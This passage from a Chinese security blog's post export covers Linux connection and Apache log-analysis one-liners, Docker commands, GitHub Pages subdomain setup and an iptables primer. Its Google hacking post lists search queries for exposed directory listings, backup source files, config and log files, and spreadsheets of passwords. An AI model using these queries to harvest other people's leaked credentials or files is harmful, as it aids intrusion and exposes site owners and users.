<p>统计httpd进程数，连个请求会启动一个进程，使用于Apache服务器。<br>表示Apache能够处理1388个并发请求，这个值Apache可根据负载情况自动调整</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ netstat -nat|grep -i &quot;80&quot;|wc -l</span><br><span class="line">4341</span><br></pre></td></tr></table></figure>

<p>netstat -an会打印系统当前网络链接状态，而grep -i “80”是用来提取与80端口有关的连接的，wc -l进行连接数统计。<br>最终返回的数字就是当前所有80端口的请求总数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ netstat -na|grep ESTABLISHED|wc -l</span><br><span class="line">376</span><br></pre></td></tr></table></figure>

<p>netstat -an会打印系统当前网络链接状态，而grep ESTABLISHED 提取出已建立连接的信息。然后wc -l统计最终返回的数字就是当前所有80端口的已建立连接的总数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ netstat -nat||grep ESTABLISHED|wc</span><br></pre></td></tr></table></figure>

<p>可查看所有建立连接的详细记录</p>
<p><strong>19、输出每个ip的连接数，以及总的各个状态的连接数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ netstat -n | awk &#x27;/^tcp/ &#123;n=split($(NF-1),array,&quot;:&quot;);if(n&lt;=2)++S[array[(1)]];else++S[array[(4)]];++s[$NF];++N&#125; END &#123;for(a in S)&#123;printf(&quot;%-20s %s&quot;, a, S[a]);++I&#125;printf(&quot;%-20s %s&quot;,&quot;TOTAL_IP&quot;,I);for(a in s) printf(&quot;%-20s %s&quot;,a, s[a]);printf(&quot;%-20s %s&quot;,&quot;TOTAL_LINK&quot;,N);&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>20、其他的收集</strong></p>
<p>分析日志文件下 2012-05-04 访问页面最高 的前20个 URL 并排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat access.log |grep &#x27;17/Apr/2021&#x27;| awk &#x27;&#123;print $11&#125;&#x27;|sort|uniq -c|sort -nr|head -20</span><br></pre></td></tr></table></figure>

<p>查询受访问页面的URL地址中 含有 <span class="exturl" data-url="aHR0cDovL3d3dy5hYmMuY29tLw==">www.abc.com<i class="fa fa-external-link-alt"></i></span> 网址的 IP 地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat access_log | awk &#x27;($11~/www.abc.com/)&#123;print $1&#125;&#x27;|sort|uniq -c|sort -nr</span><br></pre></td></tr></table></figure>

<p>获取访问最高的10个IP地址 同时也可以按时间来查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat linewow-access.log|awk &#x27;&#123;print $1&#125;&#x27;|sort|uniq -c|sort -nr|head -10</span><br></pre></td></tr></table></figure>

<p>时间段查询日志时间段的情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat log_file | egrep &#x27;15/Apr/2021|17/Apr/2021&#x27; |awk &#x27;&#123;print $1&#125;&#x27;|sort|uniq -c|sort -nr|head -10</span><br></pre></td></tr></table></figure>

<p>分析2021&#x2F;4&#x2F;15 到 2021&#x2F;4&#x2F;17 访问”&#x2F;index.php?g&#x3D;Member&amp;m&#x3D;Public&amp;a&#x3D;sendValidCode”的IP倒序排列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat log_file | egrep &#x27;15/Apr/2021|17/Apr/2021&#x27; | awk &#x27;&#123;if($7 == &quot;/index.php?g=Member&amp;m=Public&amp;a=sendValidCode&quot;) print $1,$7&#125;&#x27;|sort|uniq -c|sort -nr</span><br></pre></td></tr></table></figure>

<p>($7~&#x2F;.php&#x2F;) $7里面包含.php的就输出,本句的意思是最耗时的一百个PHP页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat log_file |awk &#x27;($7~/.php/)&#123;print $NF &quot; &quot; $1 &quot; &quot; $4 &quot; &quot; $7&#125;&#x27;|sort -nr|head -100</span><br></pre></td></tr></table></figure>

<p>列出最最耗时的页面(超过60秒的)的以及对应页面发生次数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat access.log |awk &#x27;($NF &gt; 60 &amp;&amp; $7~/.php/)&#123;print $7&#125;&#x27;|sort -n|uniq -c|sort -nr|head -100</span><br></pre></td></tr></table></figure>

<p>统计网站流量（G)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat access.log |awk &#x27;&#123;sum+=$10&#125; END &#123;print sum/1024/1024/1024&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>统计404的连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ awk &#x27;($9 ~/404/)&#x27; access.log | awk &#x27;&#123;print $9,$7&#125;&#x27; | sort</span><br></pre></td></tr></table></figure>

<p>统计http status</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat access.log |awk &#x27;&#123;counts[$(9)]+=1&#125;; END &#123;for(code in counts) print code, counts[code]&#125;&#x27; </span><br><span class="line">$ cat access.log |awk &#x27;&#123;print $9&#125;&#x27;|sort|uniq -c|sort -rn</span><br></pre></td></tr></table></figure>

<p>每秒并发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ watch &quot;awk &#x27;&#123;if($9~/200|30|404/)COUNT[$4]++&#125;END&#123;for( a in COUNT) print a,COUNT[a]&#125;&#x27; log_file|sort -k 2 -nr|head -n10&quot;</span><br></pre></td></tr></table></figure>

<p>带宽统计</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat apache.log |awk &#x27;&#123;if($7~/GET/) count++&#125;END&#123;print &quot;client_request=&quot;count&#125;&#x27; </span><br><span class="line">$ cat apache.log |awk &#x27;&#123;BYTE+=$11&#125;END&#123;print &quot;client_kbyte_out=&quot;BYTE/1024&quot;KB&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>找出某天访问次数最多的10个IP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat access.log | grep &quot;15/Apr/2021&quot; |awk &#x27;&#123;print $3&#125;&#x27;|sort |uniq -c|sort -nr|head</span><br></pre></td></tr></table></figure>

<p>当天ip连接数最高的ip都在干些什么</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat access.log | grep &quot;10.0.21.17&quot; | awk &#x27;&#123;print $8&#125;&#x27; | sort | uniq -c | sort -nr | head -n 10</span><br></pre></td></tr></table></figure>

<p>小时单位里ip连接数最多的10个时段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ awk -vFS=&quot;[:]&quot; &#x27;&#123;gsub(&quot;-.*&quot;,&quot;&quot;,$1);num[$2&quot; &quot;$1]++&#125;END&#123;for(i in num)print i,num[i]&#125;&#x27; log_file | sort -n -k 3 -r | head -10</span><br></pre></td></tr></table></figure>

<p>找出访问次数最多的几个分钟</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ awk &#x27;&#123;print $1&#125;&#x27; access.log | grep &quot;20/Mar/2011&quot; |cut -c 14-18|sort|uniq -c|sort -nr|head</span><br></pre></td></tr></table></figure>

<p>取5分钟日志</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ if [ $DATE_MINUTE != $DATE_END_MINUTE ] ;then #则判断开始时间戳与结束时间戳是否相等</span><br><span class="line">START_LINE=sed -n &quot;/$DATE_MINUTE/=&quot; $APACHE_LOG|head -n1 #如果不相等，则取出开始时间戳的行号，与结束时间戳的行号</span><br></pre></td></tr></table></figure>

<p>查看tcp的链接状态</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ netstat -nat |awk &#x27;&#123;print $6&#125;&#x27;|sort|uniq -c|sort -rn </span><br><span class="line">$ netstat -n | awk &#x27;/^tcp/ &#123;++S[$NF]&#125;;END &#123;for(a in S) print a, S[a]&#125;&#x27; </span><br><span class="line">$ netstat -n | awk &#x27;/^tcp/ &#123;++state[$NF]&#125;; END &#123;for(key in state) print key,&quot;&quot;,state[key]&#125;&#x27; </span><br><span class="line">$ netstat -n | awk &#x27;/^tcp/ &#123;++arr[$NF]&#125;;END &#123;for(k in arr) print k,&quot;&quot;,arr[k]&#125;&#x27; </span><br><span class="line">$ netstat -n |awk &#x27;/^tcp/ &#123;print $NF&#125;&#x27;|sort|uniq -c|sort -rn </span><br><span class="line">$ netstat -ant | awk &#x27;&#123;print $NF&#125;&#x27; | grep -v &#x27;[a-z]&#x27; | sort | uniq -c</span><br><span class="line">$ netstat -ant|awk &#x27;/ip:80/&#123;split($5,ip,&quot;:&quot;);++S[ip[1]]&#125;END&#123;for (a in S) print S[a],a&#125;&#x27; |sort -n </span><br><span class="line">$ netstat -ant|awk &#x27;/:80/&#123;split($5,ip,&quot;:&quot;);++S[ip[1]]&#125;END&#123;for (a in S) print S[a],a&#125;&#x27; |sort -rn|head -n 10 </span><br><span class="line">$ awk &#x27;BEGIN&#123;printf (&quot;http_codecount_num&quot;)&#125;&#123;COUNT[$10]++&#125;END&#123;for (a in COUNT) printf a&quot;&quot;COUNT[a]&quot;&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>查找请求数前20个IP（常用于查找攻来源）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ netstat -anlp|grep 80|grep tcp|awk &#x27;&#123;print $5&#125;&#x27;|awk -F: &#x27;&#123;print $1&#125;&#x27;|sort|uniq -c|sort -nr|head -n20 </span><br><span class="line">$ netstat -ant |awk &#x27;/:80/&#123;split($5,ip,&quot;:&quot;);++A[ip[1]]&#125;END&#123;for(i in A) print A[i],i&#125;&#x27; |sort -rn|head -n20</span><br></pre></td></tr></table></figure>

<p>用tcpdump嗅探80端口的访问看看谁最高</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ tcpdump -i eth0 -tnn dst port 80 -c 1000 | awk -F&quot;.&quot; &#x27;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4&#125;&#x27; | sort | uniq -c | sort -nr |head -20</span><br></pre></td></tr></table></figure>

<p>查找较多time_wait连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ netstat -n|grep TIME_WAIT|awk &#x27;&#123;print $5&#125;&#x27;|sort|uniq -c|sort -rn|head -n20</span><br></pre></td></tr></table></figure>

<p>找查较多的SYN连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ netstat -an | grep SYN | awk &#x27;&#123;print $5&#125;&#x27; | awk -F: &#x27;&#123;print $1&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure>

<p>根据端口列进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ netstat -ntlp | grep 80 | awk &#x27;&#123;print $7&#125;&#x27; | cut -d/ -f1</span><br></pre></td></tr></table></figure>

<p>查看了连接数和当前的连接数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ netstat -ant | grep $ip:80 | wc -l </span><br><span class="line">$ netstat -ant | grep $ip:80 | grep EST | wc -l</span><br></pre></td></tr></table></figure>

<p>查看IP访问次数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ netstat -nat|grep &quot;:80&quot;|awk &#x27;&#123;print $5&#125;&#x27; |awk -F: &#x27;&#123;print $1&#125;&#x27; | sort| uniq -c|sort -n</span><br></pre></td></tr></table></figure>

<p>Linux命令分析当前的链接状况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$netstat -n | awk &#x27;/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;&#x27;</span><br><span class="line">$watch &quot;netstat -n | awk &#x27;/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;&#x27;&quot; # 通过watch可以一直监控</span><br><span class="line">$LAST_ACK 5 #关闭一个TCP连接需要从两个方向上分别进行关闭，双方都是通过发送FIN来表示单方向数据的关闭，当通信双方发送了最后一个FIN的时候，发送方此时处于LAST_ACK状态，当发送方收到对方的确认（Fin的Ack确认）后才真正关闭整个TCP连接；</span><br><span class="line"></span><br><span class="line">$SYN_RECV 30  # 表示正在等待处理的请求数；</span><br><span class="line"></span><br><span class="line">$ESTABLISHED 1597 # 表示正常数据传输状态； </span><br><span class="line"></span><br><span class="line">$FIN_WAIT1 51 # 表示server端主动要求关闭tcp连接； </span><br><span class="line"></span><br><span class="line">$FIN_WAIT2 504 # 表示客户端中断连接； </span><br><span class="line"></span><br><span class="line">$TIME_WAIT 1057  # 表示处理完毕，等待超时结束的请求数；</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>docker常用命令</title>
    <url>/2020/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.html</url>
    <content><![CDATA[<p><font color=green>Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源，可用于开发，交付和运行应用程序的开放平台。而在安全测试中我们可以利用docker快速搭建出理想环境，进而复现测试漏洞，下面👇我整理出来一些常用命令，作为备忘。</font></p>
<h3 id="0、重点！重点！重点！"><a href="#0、重点！重点！重点！" class="headerlink" title="0、重点！重点！重点！"></a>0、重点！重点！重点！</h3><p>Docker三要素：<font color=red>镜像、容器、仓库</font><br>仓库：集中存放镜像文件的地方；仓库分为公开仓库和私有仓库，目前全世界最大的仓库是Docker官方的 Docker Hub<br>镜像：Docker 镜像（Image），就相当于是一个 root 文件系统。<br>容器：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。<span id="more"></span></p>
<h3 id="1、帮助命令："><a href="#1、帮助命令：" class="headerlink" title="1、帮助命令："></a>1、帮助命令：</h3><ul>
<li>查看docker版本信息：docker  version</li>
<li>查看系统相关信息：docker  info</li>
<li>查看docker帮助文档：docker  –help</li>
</ul>
<h3 id="2、镜像命令："><a href="#2、镜像命令：" class="headerlink" title="2、镜像命令："></a>2、镜像命令：</h3><ul>
<li>列出本地主机的镜像：docker  images<br>    可选参数：<br>          -a：所有镜像；<br>          -q：只显示镜像ID；<br>          –digests：显示镜像摘要信息<br>          –no-trunc：显示完整的镜像信息</li>
<li>搜索某个镜像：docker  search  镜像名 [options]<br>   可选参数：<br>         –no-trunc：显示完整的镜像描述<br>         -f：按key&#x3D;value过滤结果<br>         –limit：限制结果条数,默认25条结果</li>
<li>下载某个镜像：docker  pull 镜像名[:TAG]</li>
<li>删除本地镜像：<br>删除单个：docker  rmi  -f 镜像ID<br>删除多个：docker  rmi -f 镜像名1:TAG 镜像名2:TAG<br>删除全部：docker  rmi -f $(docker  images  -qa</li>
</ul>
<h3 id="3、容器命令："><a href="#3、容器命令：" class="headerlink" title="3、容器命令："></a>3、容器命令：</h3><ul>
<li><p>新建并启动容器：docker  run  [options] 镜像名&#x2F;imageID<br>常用options选项：<br>–name&#x3D;”容器新名字”：为容器指定一个名称<br>   -d：后台运行容器，并返回容器ID<br>-i：以交互模式运行容器，通常与-t同时使用<br>-t：为容器重新分配一个伪输入的终端<br>-P：随机端口映射<br>-p：指定端口映射，有以下四种格式<br>    ip:hostPort:containerPort<br>    ip::containerPort<br>    <font color=red>hostPort:containerPort</font><br>    containerPort</p>
</li>
<li><p>列出运行的容器：docker  ps  [options]<br>常用options选项：<br>-a :列出当前所有正在运行的容器+历史上运行过的<br>-l :显示最近创建的容器。<br>-n：显示最近n个创建的容器。<br>-q :静默模式，只显示容器编号。<br>–no-trunc :不截断输出。</p>
</li>
<li><p>退出容器：<br>exit：容器停止并退出<br>ctrl：容器不停止退出</p>
</li>
<li><p>启动容器：docker start 容器ID&#x2F;容器名</p>
</li>
<li><p>重启容器：docker restart 容器ID&#x2F;容器名</p>
</li>
<li><p>停止容器：docker stop 容器ID&#x2F;容器名</p>
</li>
<li><p>强制停止容器：docker kill 容器ID&#x2F;容器名</p>
</li>
<li><p>删除停止的容器：docker rm 容器ID<br>一次性删除多个容器：docker  rm -f $(docker ps -qa)</p>
</li>
</ul>
<h3 id="4、其它命令："><a href="#4、其它命令：" class="headerlink" title="4、其它命令："></a>4、其它命令：</h3><ul>
<li>查看容器日志：docker logs -f -t –tail 容器ID<br>-t：显示时间戳<br>    -f：跟随最新日志打印<br>    –tail：数字 显示最后多少条</li>
<li>查看容器内运行的进程：docker top 容器ID</li>
<li>查看容器内详情：docker inspect 容器ID</li>
<li>进入正运行的容器并以命令行交互：<br>docker exec -it 容器ID &#x2F;bin&#x2F;bash</li>
<li>重新进入正运行的容器：<br>docker attach 容器ID<br><font color=red>attach：直接进入容器启动的命令终端，不会启动新的进程；<br>exec：是在容器打开新的终端，并且可以启动新的进程</font></li>
<li>从容器内拷贝文件到主机上：<br>docker cp 容器ID:容器内路径 目的主机路径</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>如何拥有多个GitHub Pages</title>
    <url>/2021/gitpage.html</url>
    <content><![CDATA[<blockquote>
<h2 id="只能为每个-GitHub-帐户创建一个用户或组织站点；而项目站点没有限制"><a href="#只能为每个-GitHub-帐户创建一个用户或组织站点；而项目站点没有限制" class="headerlink" title="只能为每个 GitHub 帐户创建一个用户或组织站点；而项目站点没有限制"></a>只能为每个 GitHub 帐户创建一个用户或组织站点；而项目站点没有限制</h2></blockquote>
<p>​    也就是名为 <code>&lt;user&gt;.github.io</code>的仓库。<strong>想要创建更多的GitHub Pages页面，可以通过创建项目站点实现。</strong>项目站点的数量没有限制</p>
<p>​    有三种类型的 GitHub Pages 站点：项目、用户和组织。 项目站点连接到 GitHub 上托管的特定项目。 用户和组织站点连接到特定的 GitHub 帐户。</p>
<p>​    要发布用户站点，必须创建名为 <code>&lt;user&gt;.github.io</code> 的用户帐户所拥有的仓库。 要发布组织站点，必须创建名为 <code>&lt;organization&gt;.github.io</code> 的组织所拥有的仓库。 除非您使用自定义域，否则用户和组织站点位于 <code>http(s)://&lt;username&gt;.github.io</code> 或 <code>http(s)://&lt;organization&gt;.github.io</code>。<span id="more"></span></p>
<h3 id="一、创建项目"><a href="#一、创建项目" class="headerlink" title="一、创建项目"></a>一、创建项目</h3><ol>
<li>新建一个仓库，名称随意。</li>
<li>进入仓库主页，点击右面的<code>Settings</code>，找到<strong>GitHub Pages</strong>部分，选择Source&gt;main即可。</li>
<li>建议勾选 <code>Enforce HTTPS</code>，否则访问时会出现安全警告。</li>
<li>没有出错的话，一个项目主页就建立完成了，可以通过<code>&lt;username&gt;.github.io/&lt;projectname&gt;</code>访问到了</li>
</ol>
<p>这里我新建的项目为<code>TBOsec.github.io/DownGit</code> 。可以看到这个地址有点丑，而且地址对大小写敏感。我希望通过 <code>downgit.h0sec.com</code> 这样更加美观的地址访问，那么就需要设置和绑定子域名。</p>
<h3 id="二、绑定子域名"><a href="#二、绑定子域名" class="headerlink" title="二、绑定子域名"></a>二、绑定子域名</h3><p><u>通常，当我们购买一个域名后，就可以使用它的子域名。子域名的数量、子域名长度的限制各个域名商会有所不同</u></p>
<p>以我为例，我的域名为<code>h0sec.com</code>，我希望使用<code>downgit.h0sec.com</code> 这个子域名</p>
<ol>
<li>在项目仓库里新建一个<code>CNAME</code>文件，并将不带协议名的裸域名写进去（<code>downgit.h0sec.com</code>而不是<code>https://downgit.h0sec.com/</code>）</li>
<li>去DNS服务商的网站，给对应的二级域名添加**<code>CNAME</code>**解析到<code>&lt;username&gt;.github.io</code>（和个人主页的相同）</li>
<li>等待DNS生效，具体时间和服务商有关 <!--大约几分钟--></li>
<li>成功后，可以通过更好看的 downgit.h0sec.com&#96; 地址访问到了项目站点了</li>
</ol>
<img src="../images/upload/202104081.png" style="zoom:67%;" />

<h3 id="三、启用HTTPS"><a href="#三、启用HTTPS" class="headerlink" title="三、启用HTTPS"></a>三、启用HTTPS</h3><p>虽然现在可以通过<code>downgit.h0sec.com</code>访问，但是无法使用https，这是GitHub Pages本身的限制</p>
<img src="../images/upload/202104082.png" style="zoom:50%;" />

<p>首先，为什么要使用 https 协议？因为 https 协议提高网站访问安全性、目前越来越多的浏览器会判断当前站点支不支持https协议。</p>
<p>​    默认情况下使用GitHub Pages的给定域名则支持http和https两种协议，但是如果使用自定义域名的话，则只能通过<code>http://</code>访问，也就是说我们在<code>Github上搭建 Hexo 或Jekyll 主题博客</code>后，通过<code>CNAME</code>绑定个人域名后，我们只能通过<code>http://</code>域名来访问。</p>
<p>​    如果访问<code>https://XXX.github.io/</code>(即原来的GitHub Pages域名)将会被重定向到<code>我们的自定义域名</code>。但若直接访问<code>https://我们的自定义域名</code>，浏览器会报<code>SSL_DOMAIN_NOT_MATCHED</code>警告。</p>
<p><u><strong>那么怎么给自己的域名加上<code>https</code>呢？</strong></u></p>
<p>​    <strong><span class="exturl" data-url="aHR0cHM6Ly93d3cuY2xvdWRmbGFyZS5jb20vemgtY24v">CloudFlare<i class="fa fa-external-link-alt"></i></span></strong> 是一家CDN提供商，它提供了<code>免费的https服务</code>(但不是应用SSL证书)。实现模式就是，用户到CDN服务器的连接为<code>https</code>，而CDN服务器到GithubPage服务器的连接为<code>http</code>，就是在CDN服务器那里加上反向代理。</p>
<ol>
<li>注册并登录CloudFlare，并将自己域名下的<code>name server</code>修改为CloudFlare的<code>name server</code>。</li>
<li>在CloudFlare的DNS设置域名匹配到自己的GithubPage(启用动态DNS加速)。</li>
<li>在CloudFlare的**<code>SSL/TLS</code>**设置SSL&#x2F;TLS为<code>完全 </code>   (等待一定时间实现建立连接后，就可以通过<code>https</code>来访问自己的 GithubPage )。</li>
<li>在CloudFlare的<code>边缘证书</code>中设置路由规则。一般情况下，设置<code>始终使用HTTPS</code>， 这样就可以把 <code>http</code> 链接强制转换为 <code>https</code>。</li>
</ol>
<img src="../images/upload/202104083.png" style="zoom:50%;" />

<img src="../images/upload/202104084.png" style="zoom:50%;" />

<p>这样不管通过http访问将跳转到https，正常访问</p>
<img src="../images/upload/202104085.png" style="zoom:50%;" />]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Network</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>googlehack</title>
    <url>/2018/googlehack.html</url>
    <content><![CDATA[<p>Google是一个伟大的信息收集工具，在如今的互联网时代，想想看一个人可以轻易的从搜索引擎中获取你详细的个人信息是件多么叫人激动又害怕的事情。Google也可以当作我们的第二个“社工库”。<span id="more"></span><br>More info:<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZ29vZ2xlLWhhY2tpbmctZGF0YWJhc2U=">Google Hacking<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="Google基本关键词"><a href="#Google基本关键词" class="headerlink" title="Google基本关键词"></a><a href="#Google%E5%9F%BA%E6%9C%AC%E5%85%B3%E9%94%AE%E8%AF%8D" title="Google基本关键词"></a>Google基本关键词</h2><p>Intext： 搜索出现的关键词<br>Inurl： 搜索包含关键词的url<br>Intitle： 搜索包含关键词的标题<br>Site： 搜索包含关键词的站点<br>filetype： 搜索包含关键词的文件类型<br>Link： 对于页面包含的外部链接搜索<br>Daterange： 搜索特定的日期范围</p>
<h2 id="Google基本规则"><a href="#Google基本规则" class="headerlink" title="Google基本规则"></a><a href="#Google%E5%9F%BA%E6%9C%AC%E8%A7%84%E5%88%99" title="Google基本规则"></a>Google基本规则</h2><p>Google 不分大小写<br>Google 可以使用通配符：*表示一个词&#x2F;字<br>Google 会智能地保留一些内容，比如一些过时的词，一些不适合呈现的内容（比如违法信息）<br>最常用的：”关键字” ，双引号会使Google强制搜索包含关键字的内容布尔操作符：AND(+) NOT(-) OR(|)，AND 现在已不需要，多个关键字google会都匹配到</p>
<h2 id="常用示例"><a href="#常用示例" class="headerlink" title="常用示例"></a><a href="#%E5%B8%B8%E7%94%A8%E7%A4%BA%E4%BE%8B" title="常用示例"></a>常用示例</h2><h3 id="1、目录列表查找"><a href="#1、目录列表查找" class="headerlink" title="1、目录列表查找"></a><a href="#1%E3%80%81%E7%9B%AE%E5%BD%95%E5%88%97%E8%A1%A8%E6%9F%A5%E6%89%BE" title="1、目录列表查找"></a>1、目录列表查找</h3><p>目录列表能列出存在于一个web服务器上的文件和目录<br>查找目录列表<br>实例：<br>intitle:index.of 这里的休止符代表的是单个字母的通配符<br>更优化的查找<br>实例：<br>intitle:index.of “parent directory”<br>intitle:index.of name size</p>
<h3 id="2、特定版本的）服务器"><a href="#2、特定版本的）服务器" class="headerlink" title="2、特定版本的）服务器"></a><a href="#2%E3%80%81%E7%89%B9%E5%AE%9A%E7%89%88%E6%9C%AC%E7%9A%84%EF%BC%89%E6%9C%8D%E5%8A%A1%E5%99%A8" title="2、特定版本的）服务器"></a>2、特定版本的）服务器</h3><p>能被攻击者用来决定攻击web服务器最佳方法的一小段信息，就是确切的服务器版本<br>实例：<br>intitle:index.of “server at”<br>intitle:index.of “Apache&#x2F;1.3.27 Server at”</p>
<h3 id="3、扩展遍历技术"><a href="#3、扩展遍历技术" class="headerlink" title="3、扩展遍历技术"></a><a href="#3%E3%80%81%E6%89%A9%E5%B1%95%E9%81%8D%E5%8E%86%E6%8A%80%E6%9C%AF" title="3、扩展遍历技术"></a>3、扩展遍历技术</h3><p>经常会出现web页面的备份文件，他们有泄露源码的倾向。常常在配置错误的时候出现这种问题，把php代码备份到不是以php结尾的文件中，比如bak<br>实例：<br>intitle:index.of index.php.bak<br>inurl:index.php.bak</p>
<h3 id="4、配置文件的查找"><a href="#4、配置文件的查找" class="headerlink" title="4、配置文件的查找"></a><a href="#4%E3%80%81%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E6%9F%A5%E6%89%BE" title="4、配置文件的查找"></a>4、配置文件的查找</h3><p>配置文件的存在说明服务就在附近<br>实例：<br>filetype:conf inurl:firewall<br>如果你能知道配置文件的名字也是一个非常好的搜索方式，当然你可以从配置文件中抽取特定的字符串来查询，如果能再配上软件名字的话就效果更好了</p>
<h3 id="5、日志文件的查找"><a href="#5、日志文件的查找" class="headerlink" title="5、日志文件的查找"></a><a href="#5%E3%80%81%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E7%9A%84%E6%9F%A5%E6%89%BE" title="5、日志文件的查找"></a>5、日志文件的查找</h3><p>日志文件中也记录着日志很多的敏感信息<br>日志文件也有一个默认的名字可以被我们用作基础的搜索，最常见的扩展名就是log了<br>实例：<br>filetype:log inurl:log<br>ext log log<br>filetype:log username putty</p>
<h3 id="6、office文档"><a href="#6、office文档" class="headerlink" title="6、office文档"></a><a href="#6%E3%80%81office%E6%96%87%E6%A1%A3" title="6、office文档"></a>6、office文档</h3><p>实例：<br>filetype:xls inurl:password.xls<br>filetype:xls username password email</p>
<h3 id="6、登录入口"><a href="#6、登录入口" class="headerlink" title="6、登录入口"></a><a href="#6%E3%80%81%E7%99%BB%E5%BD%95%E5%85%A5%E5%8F%A3" title="6、登录入口"></a>6、登录入口</h3><p>登录入口是第一道防线，很容易泄露软硬件的信息<br>查找入口一般使用关键字login<br>大的厂商一般会把版权的注意事项放在页面的底部<br>实例：<br>intitle:login intext:版权信息</p>
<h3 id="7、错误消息"><a href="#7、错误消息" class="headerlink" title="7、错误消息"></a><a href="#7%E3%80%81%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF" title="7、错误消息"></a>7、错误消息</h3><p>数据库的错误消息能够用来分析操作系统和web服务器的版本，还可能更多<br>SQL command not properly ended<br>这个表示没有在sql语句的最后找到正确的终止符，所以可能会被用于注入攻击</p>
<h3 id="8、真实的数据库文件"><a href="#8、真实的数据库文件" class="headerlink" title="8、真实的数据库文件"></a><a href="#8%E3%80%81%E7%9C%9F%E5%AE%9E%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6" title="8、真实的数据库文件"></a>8、真实的数据库文件</h3><p>攻击者还能直接搜索到数据库本身，并不适合所有的数据库系统，只适合哪些有着特定名字或者扩展名的数据库,因为是二进制文件，所以没法在里面搜索字符<br>实例：<br>filetype:mdb inurl:com</p>
]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Penetration</tag>
      </tags>
  </entry>
  <entry>
    <title>iptables常用示例</title>
    <url>/2019/iptables%E5%B8%B8%E7%94%A8%E7%A4%BA%E4%BE%8B.html</url>
    <content><![CDATA[<p>在早期的Linux系统中，默认使用的是iptables防火墙管理服务来配置防火墙。尽管新型的firewalld防火墙管理服务已经被投入使用多年，但是大量的企业在生产环境中依然出于各种原因而继续使用iptables。所以本文提供了一些常用示例。<span id="more"></span><br>命令格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables [-t 表名] 选项 [链名] [条件] [-j 控制类型]</span>
</pre></td></tr></table></figure>

<p>参数：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
<span class="line">3</span>
<span class="line">4</span>
<span class="line">5</span>
<span class="line">6</span>
<span class="line">7</span>
<span class="line">8</span>
<span class="line">9</span>
<span class="line">10</span>
<span class="line">11</span>
<span class="line">12</span>
<span class="line">13</span>
</pre></td><td class="code"><pre><span class="line">-P 设置默认策略:iptables -P INPUT (DROP|ACCEPT)</span>
<span class="line">-F 清空规则链</span>
<span class="line">-L 查看规则链</span>
<span class="line">-A 在规则链的末尾加入新规则</span>
<span class="line">-I num 在规则链的头部加入新规则</span>
<span class="line">-D num 删除某一条规则</span>
